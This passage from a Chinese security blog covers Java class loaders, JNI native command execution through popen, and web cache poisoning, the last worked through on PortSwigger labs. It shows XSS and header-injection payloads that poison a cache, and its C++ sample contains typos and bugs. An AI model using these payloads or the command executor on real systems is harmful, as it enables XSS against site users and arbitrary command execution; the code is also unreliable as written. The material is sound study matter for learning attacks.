<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testCL</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hello的类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">testClassName</span> <span class="operator">=</span> <span class="string">&quot;classloader.hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hello类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;</span><br><span class="line">           <span class="number">84</span>,-<span class="number">19</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">0</span>,<span class="number">17</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">46</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,-<span class="number">13</span>,<span class="number">125</span>,-<span class="number">99</span>,<span class="number">89</span>,-<span class="number">110</span>,-<span class="number">64</span>,-<span class="number">116</span>,<span class="number">86</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">120</span>,<span class="number">112</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理hello类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的native方法定义hello类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        <span class="type">testCL</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">testCL</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载hello类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">testClass</span> <span class="operator">=</span> loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射创建hello类，等价于 hello t = new hello();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">testInstance</span> <span class="operator">=</span> testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射获取hello方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射调用hello方法,等价于 String str = t.hello();</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p>那些位于网络上静态文件服务器提供的jar包和class文件，jdk内置了一个URLClassLoader，用户只需要传递规范的网络路径给构造器，就可以使用URLClassLoader来加载远程类库了。</p>
<p>URLClassLoader不但可以加载远程类库，也同样可以加载本地路径的类库，取决于构造器中不同的地址形式。ExtensionClassLoader和AppClassLoader都是URLClassLoader的子类，它们都是从<code>本地文件系统</code>加载类库。</p>
<p><code>URLClassLoader</code>继承了ClassLoader，并且<code>URLClassLoader</code>提供了加载远程资源的能力，在漏洞利用的时候可以用这个特性来加载远程<code>jar</code>来实现远程的类方法利用</p>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JNI 安全基础</title>
    <url>/2022/07/01/JNI-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/JNI-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Java语言是基于C语言实现的，Java的底层很多API都是通过<code>JNI(Java Native Interface)</code>来实现的。通过<code>JNI</code>接口C&#x2F;C++和Java可以互相调用–存在跨平台问题。Java可以通过JNI调用来弥补语言自身问题的不足。</p>
<span id="more"></span>

<h3 id="JNI-定义native方法"><a href="#JNI-定义native方法" class="headerlink" title="JNI-定义native方法"></a>JNI-定义native方法</h3><p>在Java中如果需要调用native方法那么需要在类中先定义一个native方法</p>
<p>eg：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.cmd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Command_Execute</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">exec</span><span class="params">(String cmd)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//适用native关键字定义一个类似于接口的方法即可</span></span><br></pre></td></tr></table></figure>

<h3 id="JNI-生成类头文件"><a href="#JNI-生成类头文件" class="headerlink" title="JNI-生成类头文件"></a>JNI-生成类头文件</h3><p>编写好<code>Command_Execute.java</code>之后，编译生成C语言头文件</p>
<p>具体的步骤：</p>
<ol>
<li>使用<code>javac</code>编译成class文件<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">javac ./Command_Execute.java</span><br></pre></td></tr></table></figure>
2.生成头文件<br>这里需要注意jdk的版本，如果jdk的版本<code>&gt;=10</code>，那么就使用以下的命令：<code>javac</code> + <code>-h</code>生成头文件；否则的话，使用<code>javah</code>的命令生成头文件</li>
</ol>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">javac -cp . com/anbai/sec/<span class="built_in">cmd</span>/Command_Execute.java -h com/anbai/sec/<span class="built_in">cmd</span>/</span><br></pre></td></tr></table></figure>
<p>执行的结果为：<br><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210402140856138.png" alt="image-20210402140856138"></p>
<p><code>com_anbai_sec_cmd_Command_Execute.h</code>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"><span class="comment">/* Header for class com_anbai_sec_cmd_Command_Execute */</span></span><br><span class="line"></span><br><span class="line">#ifndef _Included_com_anbai_sec_cmd_Command_Execute</span><br><span class="line">#define _Included_com_anbai_sec_cmd_Command_Execute</span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">#endif</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     com_anbai_sec_cmd_Command_Execute</span></span><br><span class="line"><span class="comment"> * Method:    exec</span></span><br><span class="line"><span class="comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_com_anbai_sec_cmd_Command_1Execute_exec</span></span><br><span class="line">  <span class="params">(JNIEnv *, jclass, jstring)</span>;</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>

<h5 id="头文件命名强制性"><a href="#头文件命名强制性" class="headerlink" title="头文件命名强制性"></a>头文件命名强制性</h5><p>生成的头文件之中的函数命名方式是有非常强制性的约束的：</p>
<p>在<code>Java_com_anbai_sec_cmd_Command_1Execute_exec.h</code>之中：</p>
<ul>
<li><code>Java_</code>是固定的前缀；</li>
<li><code>com_anbai_sec_cmd_Command_1Execute</code>代表这Java的完整的包名：<code>com.anbai.sec.cmd.Command_Execute</code></li>
<li><code>_exec</code>是表示的方法的名称</li>
<li>在Java 层的下划线使用 <code>_1</code> 替代，这是因为 Native 层的下划线已经用来替代 Java 层的逗号了，所以 Java 层的下划线只能用 <code>_1</code> 表示了。</li>
<li>剩下的<code>(JNIEnv *, jclass, jstring);</code>依次是：<ul>
<li>JNI环境变量</li>
<li>java调用的对象</li>
<li>传入的参数类型<br>(这里的<code>JNIEnv</code>是一个指针类型，可以用它范围跟Java层的代码，他不能被跨进程被调用。)</li>
</ul>
</li>
</ul>
<h3 id="JNI-数据类型"><a href="#JNI-数据类型" class="headerlink" title="JNI 数据类型"></a>JNI 数据类型</h3><p>在Java之中，数据类型可以分为两类：一类是<code>基本数据类型</code>；一类是<code>引用类型</code></p>
<p>基本数据类型：bool,char,byte,short,int,long,float,double</p>
<p>引用类型：除了基本数据类型以外的所有数据类型都是引用类型，包括数组等等</p>
<p>通过JNI的类型定义可以让java的基本数据类型和原生语言的基本类型相映射–即通过jni.h头文件，可以通过jni头文件中定义的类型在原生语言中实现操作java对象。</p>
<h5 id="Java基本数据类型"><a href="#Java基本数据类型" class="headerlink" title="Java基本数据类型"></a>Java基本数据类型</h5><table>
<thead>
<tr>
<th>Java类型</th>
<th>JNI类型</th>
<th>C&#x2F;C++类型</th>
<th>大小</th>
</tr>
</thead>
<tbody><tr>
<td>Boolean</td>
<td>Jboolean</td>
<td>unsigned char</td>
<td>无符号8位</td>
</tr>
<tr>
<td>Byte</td>
<td>Jbyte</td>
<td>char</td>
<td>有符号8位</td>
</tr>
<tr>
<td>Char</td>
<td>Jchar</td>
<td>unsigned short</td>
<td>无符号16位</td>
</tr>
<tr>
<td>Short</td>
<td>Jshort</td>
<td>short</td>
<td>有符号16位</td>
</tr>
<tr>
<td>Int</td>
<td>Jint</td>
<td>int</td>
<td>有符号32位</td>
</tr>
<tr>
<td>Long</td>
<td>Jlong</td>
<td>long long</td>
<td>有符号64位</td>
</tr>
<tr>
<td>Float</td>
<td>Jfloat</td>
<td>float</td>
<td>32位</td>
</tr>
<tr>
<td>Double</td>
<td>Jdouble</td>
<td>double</td>
<td>64位</td>
</tr>
</tbody></table>
<h5 id="Java引用类型"><a href="#Java引用类型" class="headerlink" title="Java引用类型"></a>Java引用类型</h5><p>对于java的引用类型，他的内部数据结构并未对外公开，因此无法一一映射，但是在JNI类型中有一个<code>jobject类型</code>，基本是涵盖了大部分的引用类型。</p>
<p>以下列出的引用类型隐映射表，所对应的原生类型这一类对象全部都是jobject的子类。</p>
<table>
<thead>
<tr>
<th>Java 类型</th>
<th>原生类型</th>
</tr>
</thead>
<tbody><tr>
<td>java.lang.Class</td>
<td>jclass</td>
</tr>
<tr>
<td>java.lang.Throwable</td>
<td>jthrowable</td>
</tr>
<tr>
<td>java.lang.String</td>
<td>jstring</td>
</tr>
<tr>
<td>Other objects</td>
<td>jobjects</td>
</tr>
<tr>
<td>java.lang.Objects[]</td>
<td>jobjectArray</td>
</tr>
<tr>
<td>boolean[]</td>
<td>jbooleanArray</td>
</tr>
<tr>
<td>byte[]</td>
<td>jbyteArray</td>
</tr>
<tr>
<td>char[]</td>
<td>jcharArray</td>
</tr>
<tr>
<td>short[]</td>
<td>jshortArray</td>
</tr>
<tr>
<td>int[]</td>
<td>jintArray</td>
</tr>
<tr>
<td>long[]</td>
<td>jlongArray</td>
</tr>
<tr>
<td>float[]</td>
<td>jfloatArray</td>
</tr>
<tr>
<td>double[]</td>
<td>jdoubleArray</td>
</tr>
<tr>
<td>Other arrays</td>
<td>Jarray</td>
</tr>
</tbody></table>
<h5 id="对引用类型的操作"><a href="#对引用类型的操作" class="headerlink" title="对引用类型的操作"></a>对引用类型的操作</h5><p>由于引用类型对于原生语言不是公开的，因此在使用的时候需要进行转换</p>
<h6 id="String类型的处理"><a href="#String类型的处理" class="headerlink" title="String类型的处理"></a>String类型的处理</h6><ul>
<li>将C的字符串转换为java字符串：可以将c风格字符串转换为jni类型的jstring然后返回给java对象使用。如果是Unicode编码则使用NewString,UTF编码则用NewStringUTF函数。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">env-&gt;NewStringUTF(<span class="string">&quot;C的字符串&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>在原生语言中使用java字符串</li>
</ul>
<p>java字符串在原生语言中被当作引用类型来处理，因此使用之前必须转换为<code>char数组类型</code>。如果是<code>Unicode</code>的编码使用<code>GetStringChars</code>，如果是<code>UTF编码</code>则使用<code>GetStringUTFChars</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;span style=<span class="string">&quot;white-space:pre&quot;</span>&gt;	&lt;/span&gt;const <span class="type">char</span> *p;</span><br><span class="line"><span class="comment">//定义一个char指针变量</span></span><br><span class="line">	<span class="type">jboolean</span> <span class="variable">isCopy</span> <span class="operator">=</span> JNI_TRUE;</span><br><span class="line"><span class="comment">//JNI类型定义的两个常量代表jboolean的真假：JNI_TRUE--真；JNI_FALSE--假</span></span><br><span class="line">	p = env-&gt;GetStringUTFChars(param, &amp;isCopy);</span><br><span class="line"><span class="comment">//GetStringUTFChars方法返回一个指向char数组首地址的指针</span></span><br></pre></td></tr></table></figure>

<ul>
<li>释放字符串</li>
</ul>
<p>释放的方法：如果是Unicode编码使用releaseStringChars；如果是UTF编码使用releaseStringUTFChars。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">env-&gt;ReleaseStringChars(javaString, p);</span><br><span class="line"></span><br><span class="line">env-&gt;ReleaseStringUTFChars(javaString, p);</span><br><span class="line"><span class="comment">//javaString指的是java字符串对象，p指的是签名创建的字符指针对象。</span></span><br></pre></td></tr></table></figure>

<h6 id="数组类型的处理"><a href="#数组类型的处理" class="headerlink" title="数组类型的处理"></a>数组类型的处理</h6><p>由于数组也被当作引用对象，所以JNI提供函数对于数组的处理</p>
<ul>
<li><p>创建java数组</p>
<p>  通过<code>New&lt;type&gt;Array</code>函数就可以在原生语言中创建java数组，type指的是Bool,Int,Float等基本数据类型。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jintArray a= env-&gt;NewIntArray(<span class="number">10</span>);    <span class="comment">//其中10是数组的容量</span></span><br></pre></td></tr></table></figure>
<ul>
<li>访问java数组元素<br>通过<code>Get&lt;type&gt;ArrayRegion</code>函数就可以将java数组元素复制到一个C数组中，从而可以在原生语言中对其进行操作。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jint nativeArray[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//将java数组转换为c数组</span></span><br><span class="line">env-&gt;GetIntArrayRegion(array, <span class="number">0</span>, <span class="number">10</span>, nativeArray)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>这样，我们就可以操作nativeArray来访问java数组的元素了。注意这里是复制的方式，<strong>虽然访问的内容是一样的，但是他们所代表的对象不是同一个对象，而是java数组的一个副本。</strong>  </p>
<ul>
<li>将C数组复制到java数组</li>
<li>由于通过<code>Get&lt;type&gt;ArrayRegion</code>函数获取的只是java数组的副本，因此任何对c数组的操作都不会影响java数组，而如果希望将c数组操作后的结果复制会Java数组，就需要使用<code>set&lt;type&gt;ArrayRegion</code>函数。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">env-&gt;SetIntArrayRegion(array, <span class="number">0</span>, <span class="number">10</span>, nativeArray);</span><br></pre></td></tr></table></figure></li>
<li>如果指针操作java数组<br>通过<code>Get&lt;type&gt;ArrayElements</code>函数就可以获取一个指向java数组的指针    <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jint *pNative;</span><br><span class="line">jboolean isCopy=JNI_TRUE;</span><br><span class="line">pNative=env-&gt;GetIntArrayElements(array,&amp;isCopy);</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>释放指针对象：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">env-&gt;ReleaseIntArrayElements(array,pnative,<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>三种释放模式： </p>
<ul>
<li>0–将内容复制回来并且释放数组</li>
<li>JNI_COMMIT–将内容复制回来但是不释放原生数组，一般于周期性地更新一个数组</li>
<li>JNI_ABORT–不用将内容复制回来并且释放原生数组</li>
</ul>
<h6 id="原生语言访问java变量"><a href="#原生语言访问java变量" class="headerlink" title="原生语言访问java变量"></a>原生语言访问java变量</h6><p>在java之中，类有两个域，分别是静态域和实例域，一个类有很多实力域，但是这多个实例域都对应者一个静态域。</p>
<ul>
<li><p>根据调用对象获取类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jclass clazz;</span><br><span class="line">clazz = env-&gt;GetObjectClass(jTiss);</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取域id</p>
</li>
<li><p>获取java对象的实例域或者静态域，除了知道<code>所属的类</code>以外，还必须知道它的<code>域id</code>。</p>
<ul>
<li>实例域：</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jfieldID fieldID;</span><br><span class="line">fieldID = env-&gt;GetFieldID(clazz, <span class="string">&quot;instanceString&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">    <span class="comment">//第二个参数表示java类中的实例变量名称；第三个参数是方法描述符</span></span><br></pre></td></tr></table></figure>
<pre><code>* 实力域
</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jfieldID fieldID;</span><br><span class="line">fieldID = env-&gt;GetStaticFieldID(clazz, <span class="string">&quot;staticString&quot;</span>,</span><br><span class="line">			<span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line"><span class="comment">//参数域实例域的相同</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>获取java变量的值</p>
<ul>
<li>实例变量  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jstring string;</span><br><span class="line">string = (jstring) env-&gt;GetObjectField(jTiss, fieldID);</span><br></pre></td></tr></table></figure></li>
<li>静态变量  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jstring string;</span><br><span class="line">string = (jstring) env-&gt;GetStaticObjectField(clazz, fieldID);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h6 id="原生语言调用java方法"><a href="#原生语言调用java方法" class="headerlink" title="原生语言调用java方法"></a>原生语言调用java方法</h6><ul>
<li><p>获取实例方法id</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">jclass</span> <span class="variable">clazz</span> <span class="operator">=</span> env-&gt;GetObjectClass(jThis);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">methodID</span> <span class="operator">=</span> env-&gt;GetMethodID(clazz, <span class="string">&quot;getInstanceStringFromJava&quot;</span>,</span><br><span class="line">			<span class="string">&quot;()Ljava/lang/String;&quot;</span>);</span><br><span class="line"><span class="comment">//第二个参数是方法名称</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取静态方法id</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">jclass</span> <span class="variable">clazz</span> <span class="operator">=</span> env-&gt;GetObjectClass(jThis);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">methodID</span> <span class="operator">=</span> env-&gt;GetStaticMethodID(clazz,<span class="string">&quot;getStaticStringFromJava&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>调用实例方法</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">env-&gt;CallObjectMethod(jThis, methodID);</span><br></pre></td></tr></table></figure>
</li>
<li><p>调用静态方法</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">env-&gt;CallStaticObjectMethod(clazz, methodID);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="JNI-C-C-本地命令执行"><a href="#JNI-C-C-本地命令执行" class="headerlink" title="JNI C&#x2F;C++本地命令执行"></a>JNI C&#x2F;C++本地命令执行</h3><p>在生成好了头文件之后，使用C、C++编写函数的最终实现</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;com_anbai_sec_cmd_Command_Execute.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL <span class="title">Java_com_anbai_sec_cmd_Command_1Execute_exec</span></span></span><br><span class="line"><span class="function">  <span class="params">(JNIEnv *, jclass, jstring)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(str!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">    jboolean jsCopy;</span><br><span class="line">    <span class="comment">//将Jstring参数转成char指针</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *cmd = env-&gt;<span class="built_in">GetStringUTFChars</span>(str, &amp;jsCopy);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//使用popen函数执行系统命令</span></span><br><span class="line">    FILE *fd = <span class="built_in">poen</span>(cmd, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(fd!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//返回结果字符串</span></span><br><span class="line">        string result;</span><br><span class="line">        </span><br><span class="line">        <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), fd) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="comment">//拼接读取到的结果到result</span></span><br><span class="line">            result += buf;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//关闭popen</span></span><br><span class="line">        <span class="built_in">pclose</span>(fd);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(<span class="string">&quot;result.c_str()&quot;</span>);</span><br><span class="line">   		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><ul>
<li>使用<code>cl命令</code>编译dll <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cl /c com_anbai_sec_cmd_Command_Execute.cpp</span><br></pre></td></tr></table></figure></li>
<li>使用<code>gcc命令</code>编译，编译完成就可以完成动态链接库了</li>
</ul>
<p>在一般的情况下，需要严格按照JNI要求去命名文件名并且把链接库放在Java的动态链接库目录。当然，除此之外也可以自定义库名称和路径。</p>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>缓存投毒</title>
    <url>/2024/06/04/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h3 id="缓存投毒的原理"><a href="#缓存投毒的原理" class="headerlink" title="缓存投毒的原理"></a>缓存投毒的原理</h3><p>发送导致有害响应的请求，将该请求保存在缓存服务之中并且提供给其它的用户</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210518164517467.png" alt="image-20210516203552981"></p>
<hr>
<h6 id="缓存投毒与缓存欺骗的区别"><a href="#缓存投毒与缓存欺骗的区别" class="headerlink" title="缓存投毒与缓存欺骗的区别"></a>缓存投毒与缓存欺骗的区别</h6><ul>
<li>缓存投毒：攻击者诱导服务器存储一些恶意的缓存内容，且这些恶意的内容会被作为缓存影响到其它的用户</li>
<li>缓存欺骗：攻击者诱导服务器存储一些用户的敏感缓存内容，且攻击者接着从缓存获取这些敏感内容</li>
</ul>
<h3 id="缓存投毒的发现与利用"><a href="#缓存投毒的发现与利用" class="headerlink" title="缓存投毒的发现与利用"></a>缓存投毒的发现与利用</h3><h6 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h6><p>找到一处可以利用的缓存页面，即</p>
<ul>
<li>该页面会被缓存</li>
<li>可以明确地知道请求是否命中缓存</li>
<li>url回显到响应之中或者参数回显到了响应之中</li>
</ul>
<p>大概流程</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210516171057518.png" alt="image-20210518164517467"></p>
<h6 id="识别非缓存键的输入"><a href="#识别非缓存键的输入" class="headerlink" title="识别非缓存键的输入"></a>识别非缓存键的输入</h6><ul>
<li>手动修改或者添加http头部，指定随机字符来判断头部是否影响页面内容</li>
<li>使用Brupsuite的插件（<a href="https://github.com/portswigger/param-miner">Param Miner</a>–一个缓存爆破工具，通过向查询字符串添加值为随机<code>$randomplz</code>的参数来确保每个请求都有唯一的缓存键)进行判断</li>
</ul>
<h6 id="构造内容引起服务器端的有害响应"><a href="#构造内容引起服务器端的有害响应" class="headerlink" title="构造内容引起服务器端的有害响应"></a>构造内容引起服务器端的有害响应</h6><p>针对不同的非缓存键，确定那些会导致页面返回有害的内容</p>
<h6 id="获取响应，使有害内容被缓存"><a href="#获取响应，使有害内容被缓存" class="headerlink" title="获取响应，使有害内容被缓存"></a>获取响应，使有害内容被缓存</h6><p>通过构造有害的内容，访问页面，获取响应，以此将有害的内容存入缓存之中。</p>
<p>页面是否会被缓存受到文件扩展名，内容类型，url路由，状态码和响应标头的影响。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="1-资源的危险导入"><a href="#1-资源的危险导入" class="headerlink" title="1.资源的危险导入"></a>1.资源的危险导入</h4><p>某些网站会使用非缓存键动态生成页面中的url地址，比如说使用HTTP头部中的“X-Forwarded-Host”字段来设置外部托管的Javascript文件的域名(host)。</p>
<p>题目：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-with-an-unkeyed-header">Lab: Web cache poisoning with an unkeyed header</a></p>
<p>插入XSS payload并弹出cookie。</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210516222525436.png" alt="image-20210516220722649"></p>
<h4 id="2-cookie的危险导入"><a href="#2-cookie的危险导入" class="headerlink" title="2. cookie的危险导入"></a>2. cookie的危险导入</h4><p>题目：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-with-an-unkeyed-cookie">Lab: Web cache poisoning with an unkeyed cookie</a></p>
<p>插入XSS payload并弹出1</p>
<p>页面中会回显cookie中的值到js代码中</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210517204927695.png" alt="image-20210516222525436"></p>
<p>所以构造payload：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fehost</span><span class="operator">=</span>prod-cache-<span class="number">01</span><span class="string">&quot;&#125;%3Balert(1)%3Babc=&#123;&quot;</span><span class="string">&quot;:&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果为：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210516220722649.png" alt="image-20210516222816285"></p>
<h4 id="3-多个Header导致的缓存投毒"><a href="#3-多个Header导致的缓存投毒" class="headerlink" title="3. 多个Header导致的缓存投毒"></a>3. 多个Header导致的缓存投毒</h4><p>实际情况中往往会是多个Header来配合进行利用</p>
<p>题目：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-with-multiple-headers">Lab: Web cache poisoning with multiple headers</a></p>
<p>插入xss payload并且弹出cookie。即：<code>alert(document.cookie)</code></p>
<p>由于在本题之中<code>X-Forwarded-Scheme</code>头部内容不为https的时候，页面会进行302跳转到<code>https://+X-Forwarded-Host</code>所指定的地址之中去。</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210517205414663.png" alt="image-20210517204927695"></p>
<p>所以这里需要对页面中加载的外部js进行投毒</p>
<p>存储漏洞利用程序:</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210517221230239.png" alt="image-20210517205414663"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-Host: ac2b1f571edc6a48805f2eb501d20050.web-security-academy.net</span><br><span class="line">X-Forwarded-Scheme: http://</span><br></pre></td></tr></table></figure>

